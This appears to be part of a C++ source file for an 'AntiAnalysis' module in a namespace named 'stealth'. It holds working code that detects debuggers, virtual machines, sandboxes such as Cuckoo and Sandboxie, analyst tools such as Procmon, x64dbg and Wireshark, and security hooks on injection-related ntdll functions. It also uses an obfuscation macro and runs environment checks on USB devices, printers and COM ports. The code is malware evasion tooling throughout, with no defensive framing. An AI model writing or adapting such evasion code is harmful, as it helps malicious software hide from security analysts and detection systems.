        auto* dos = (IMAGE_DOS_HEADER*)mod;
        auto* nt = (IMAGE_NT_HEADERS*)((uint8_t*)mod + dos->e_lfanew);
        auto* export_dir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (export_dir->Size == 0) continue;

        // Check first bytes of critical exports for hooks
        const char* critical[] = {"NtAllocateVirtualMemory", "NtWriteVirtualMemory",
            "NtCreateThreadEx", "NtQuerySystemInformation", "NtOpenProcess",
            "NtReadVirtualMemory", "NtProtectVirtualMemory", "LdrLoadDll",
            "CreateFileW", "WriteFile", "ReadFile"};
        for (auto* func_name : critical) {
            FARPROC addr = GetProcAddress(mod, func_name);
            if (!addr) continue;
            // Check for JMP (0xE9) or CALL (0xE8) hook
            uint8_t* bytes = (uint8_t*)addr;
            if (bytes[0] == 0xE9 || bytes[0] == 0xE8 ||
                (bytes[0] == 0xFF && bytes[1] == 0x25) ||
                (bytes[0] == 0x68 && bytes[5] == 0xC3)) {
                // Potential hook
                r.confidence += 8; flags++;
                r.detected_artifacts.push_back("possible_api_hook");
                break;
            }
        }
    }
    return flags > 1;
}

bool AntiAnalysis::check_blacklisted_drivers(AnalysisResult& r) {
    const wchar_t* drivers[] = {L"dbgv.sys", L"dbk64.sys", L"Procmon23.sys",
        L"procexp.sys", L"regmon.sys", L"filemon.sys", L"sandbox.sys",
        L"npf.sys", L"dump_wmimmc.sys", L"dump_spsys.sys", L"LiveKdD.sys"};
    for (auto* d : drivers) {
        std::wstring path = L"C:\\Windows\\System32\\drivers\\" + std::wstring(d);
        if (file_exists_w(path.c_str())) { r.confidence += 10; r.detected_artifacts.push_back("analysis_driver"); return true; }
    }
    return false;
}

// ==================== DIVERSITY ====================

bool AntiAnalysis::check_misc(AnalysisResult& r) {
    INDIRECT_BRANCH;
    check_mutexes();
    check_dlls_loaded();
    check_window_names();
    check_pipe_names();
    check_domain();
    return false;
}

bool AntiAnalysis::check_mutexes() {
    const wchar_t* bad[] = {L"cuckoo", L"sandboxie", L"procmon", L"x64dbg",
        L"ollydbg", L"windbg", L"dbg", L"vbox", L"vmtools", L"vmware"};
    for (auto* b : bad) {
        HANDLE m = OpenMutexW(SYNCHRONIZE, FALSE, b);
        if (m) { CloseHandle(m); return true; }
    }
    return false;
}

bool AntiAnalysis::check_window_names() {
    const wchar_t* bad[] = {L"OLLYDBG", L"WinDbg", L"x64dbg", L"Immunity",
        L"IDA", L"Wireshark", L"Process Hacker", L"Process Explorer",
        L"ProcMon", L"RegShot", L"dnSpy", L"API Monitor"};
    for (auto* b : bad) {
        HWND w = FindWindowW(nullptr, b);
        if (w) return true;
        w = FindWindowW(b, nullptr);
        if (w) return true;
    }
    return false;
}

bool AntiAnalysis::check_pipe_names() {
    const wchar_t* pipes[] = {L"\\\\.\\pipe\\cuckoo", L"\\\\.\\pipe\\sbie",
        L"\\\\.\\pipe\\vbox", L"\\\\.\\pipe\\procmon", L"\\\\.\\pipe\\dbg"};
    for (auto* p : pipes) if (file_exists_w(p)) return true;
    return false;
}

bool AntiAnalysis::check_domain() {
    LPWSTR name = nullptr; NETSETUP_JOIN_STATUS status;
    NetGetJoinInformation(nullptr, &name, &status);
    if (name) NetApiBufferFree(name);
    return status == NetSetupDomainName; // Domains are uncommon in sandboxes
}

bool AntiAnalysis::is_debugger_present() {
    AnalysisResult r; check_debugger(r); return r.is_debugged;
}

bool AntiAnalysis::is_virtual_machine() {
    AnalysisResult r;
    check_hardware_artifacts(r); check_registry(r); check_filesystem(r);
    return r.confidence >= 30;
}

bool AntiAnalysis::is_sandboxie() { return GetModuleHandleW(L"SbieDll.dll") != nullptr; }
bool AntiAnalysis::is_wine() { return GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "wine_get_version") != nullptr; }

bool AntiAnalysis::is_cuckoo() {
    return check_proc_name(L"python.exe") && file_exists_w(L"C:\\cuckoo");
}

bool AntiAnalysis::is_process_hacker_present() {
    return check_proc_name(L"ProcessHacker.exe") ||
           check_proc_name(L"SystemInformer.exe");
}

bool AntiAnalysis::is_wireshark_present() {
    return check_proc_name(L"wireshark.exe") ||
           check_proc_name(L"dumpcap.exe") ||
           check_proc_name(L"tshark.exe");
}

void AntiAnalysis::set_on_detection(std::function<void(SandboxType)> callback) {
    on_detect_ = std::move(callback);
}

bool AntiAnalysis::check_dxgkrnl_vm() {
    return GetModuleHandleW(L"dxgkrnl.sys") == nullptr && file_exists_w(L"C:\\Windows\\System32\\drivers\\dxgkrnl.sys") == false;
}

bool AntiAnalysis::check_smbios_data() {
    HKEY k;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"SYSTEM\\CurrentControlSet\\Services\\mssmbios\\Data",
            0, KEY_READ, &k) == ERROR_SUCCESS) {
        wchar_t buf[256] = {}; DWORD sz = sizeof(buf);
        RegQueryValueExW(k, L"SMBiosData", nullptr, nullptr, (LPBYTE)buf, &sz);
        RegCloseKey(k);
        // No SMBIOS data = likely VM with minimalist BIOS
        return sz == 0 || buf[0] == 0;
    }
    return true;
}

bool AntiAnalysis::check_acpi_tables() {
    // Simplified: check for ACPI FACP table
    return !reg_key_exists(HKEY_LOCAL_MACHINE, L"HARDWARE\\ACPI\\FACP");
}

bool AntiAnalysis::check_usb_devices() {
    HDEVINFO devInfo = SetupDiGetClassDevsW(&GUID_DEVCLASS_USB, nullptr, nullptr, DIGCF_PRESENT);
    if (devInfo == INVALID_HANDLE_VALUE) return true;
    SP_DEVINFO_DATA devData = {sizeof(devData)};
    bool found = SetupDiEnumDeviceInfo(devInfo, 0, &devData) != FALSE;
    SetupDiDestroyDeviceInfoList(devInfo);
    return !found;
}

bool AntiAnalysis::check_printer() {
    DWORD needed = 0, count = 0;
    EnumPrintersW(PRINTER_ENUM_LOCAL, nullptr, 1, nullptr, 0, &needed, &count);
    return needed == 0;
}

bool AntiAnalysis::check_com_ports() {
    wchar_t buf[16];
    for (int i = 1; i <= 4; ++i) {
        swprintf(buf, 16, L"COM%d", i);
        HANDLE h = CreateFileW(buf, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
            OPEN_EXISTING, 0, nullptr);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); return false; }
    }
    return true;
}

bool AntiAnalysis::check_power_caps() {
    SYSTEM_POWER_CAPABILITIES caps = {};
    if (CallNtPowerInformation(SystemPowerCapabilities, nullptr, 0, &caps, sizeof(caps)) == ERROR_SUCCESS) {
        if (!caps.SystemBatteriesPresent && !caps.UpsPresent) return true;
    }
    return false;
}

bool AntiAnalysis::check_dlls_loaded() {
    const wchar_t* bad[] = {L"sxIn.dll", L"sf2.dll", L"snxhk.dll",
        L"cmdvrt32.dll", L"cmdvrt64.dll", L"api_log.dll", L"dir_watch.dll"};
    for (auto* d : bad) if (check_dll_loaded(d)) return true;
    return false;
}

bool AntiAnalysis::check_cpu_fan_speed() {
    // Real machines have fan speed data
    HKEY key;
    return RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"HARDWARE\\DESCRIPTION\\System\\ThermalZone", 0, KEY_READ, &key) != ERROR_SUCCESS;
}

} // namespace diarna::stealth
